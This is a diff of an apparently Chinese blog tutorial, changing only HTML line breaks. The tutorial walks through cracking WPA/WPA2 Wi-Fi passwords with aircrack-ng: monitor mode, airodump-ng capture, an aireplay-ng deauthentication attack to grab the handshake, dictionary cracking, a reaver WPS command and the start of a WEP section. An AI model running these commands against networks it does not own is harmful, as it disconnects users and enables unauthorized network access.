@@ -132,15 +132,15 @@
 <p>执行破解步骤</p>
 <ol>
 <li>
-<p>载入无线网卡<br />
+<p>载入无线网卡<br>
 首先查看无线网卡是否激活
 <pre>
 ifconfig
-</pre><br />
+</pre><br>
 如果没有看到自己的无线网卡，执行
 <pre>
 ifconfig -a
-</pre><br />
+</pre><br>
 驱动正常的情况下应该会显示出自己的网卡名，比如 wlan0 这种，我这里是 wlp4s0，使用如下命令激活无线网卡
 <pre>
 sudo ifconfig wlp4s0 up
@@ -151,16 +151,16 @@ sudo ifconfig wlp4s0 up
 <p>开启监听模式,监听模式下适配器名称会变更，比如我的变成了 wlp4s0mon
 <pre>
 sudo airmon-ng start wlp4s0
-</pre><br />
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-2.png" alt="aircrack-2" /><br />
+</pre><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-2.png" alt="aircrack-2" /><br>
 <img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-3.png" alt="aircrack-3" /></p>
 </li>
 <li>
 <p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
 <pre>
 sudo airodump-ng wlp4s0mon
-</pre><br />
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-4.png"" alt="aircrack-4" /><br />
+</pre><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-4.png"" alt="aircrack-4" /><br>
 记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描,我们的目标是 SoftAP ,所以我们记下 1 这个信道</p>
 </li>
 <li>
@@ -169,7 +169,7 @@ sudo airodump-ng wlp4s0mon
 sudo airodump-ng -c 1 –w log wlp4s0mon
 # -c 为目标AP的工作频道，我们要进行攻击测试的无线路由器工作频道为1；
 # -w 后跟要保存的文件名，名字随意。要注意的是：这里虽然设置的文件名是log，但是生成的文件却不是log.cap，而是log-01.cap，在进行第二次攻击时，若使用同样文件名log保存的话，就会生成名为log-02.cap的文件。
-</pre><br />
+</pre><br>
 <img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-5.png" alt="aircrack-5" /></p>
 </li>
 <li>
@@ -179,24 +179,24 @@ sudo aireplay-ng -0 1 –a 14:CF:92:DB:46:B3 -c CC:3A:61:C9:15:77 wlp4s0mon
 # -0 用aireplay的“0”模式（攻击模式，模拟目标客户端向AP发送重连请求，从而会使目标客户端断开连接），借以捕获握手包。后面的数字可以改为1-10不等，数字越大，攻击次数越多。
 # -a 目标无线网的MAC地址；
 # -c 客户端的MAC地址；
-</pre><br />
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-6.png" alt="aircrack-6" /><br />
+</pre><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-6.png" alt="aircrack-6" /><br>
 回到 airodump-ng 界面，右上角会出现 “WPA handshake” 的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文</p>
 </li>
 <li>
-<p>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br />
-此时终端所在工作路径目录内会有以下文件<br />
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-7.png" alt="aircrack-7" /><br />
+<p>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br>
+此时终端所在工作路径目录内会有以下文件<br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-7.png" alt="aircrack-7" /><br>
 执行
 <pre>
 sudo aircrack-ng -w blackhat/wordlist1.dic log-01.cap
 # -w 后跟预先制作的字典
-</pre><br />
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-8.png" alt="aircrack-8" /><br />
+</pre><br>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-8.png" alt="aircrack-8" /><br>
 最后记得结束网卡的监听模式
 <pre>
 sudo airmon-ng stop wlp4s0mon
-</pre><br />
+</pre><br>
 如果如上图显示，则说明找到了密码，如果没有找到密码的话，可以更换字典，再次尝试对cap文件进行密文比对，直到破解成功。所以说 WPA/WPA2 加密方式破解wifi是有一定几率的，成功与否取决于字典是否强大。</p>
 </li>
 </ol>
@@ -215,15 +215,15 @@ reaver -i wlp4s0mon -b 目标网卡的mac地址 -vv -a
 <p><strong><em>WEP破解方法(不是重点，简单介绍)</em></strong></p>
 <ol>
 <li>
-<p>载入无线网卡<br />
+<p>载入无线网卡<br>
 首先查看无线网卡是否激活
 <pre>
 ifconfig
-</pre><br />
+</pre><br>
 如果没有看到自己的无线网卡，执行
 <pre>
 ifconfig -a
-</pre><br />
+</pre><br>
 驱动正常的情况下应该会显示出自己的网卡名，比如 wlan0 这种，我这里是 wlp4s0，使用如下命令激活无线网卡
 <pre>
 sudo ifconfig wlp4s0 up
@@ -239,7 +239,7 @@ sudo airmon-ng start wlp4s0
 <p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
 <pre>
 sudo airodump-ng wlp4s0mon
-</pre><br />
+</pre><br>
 记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描</p>
 </li>
 <li>
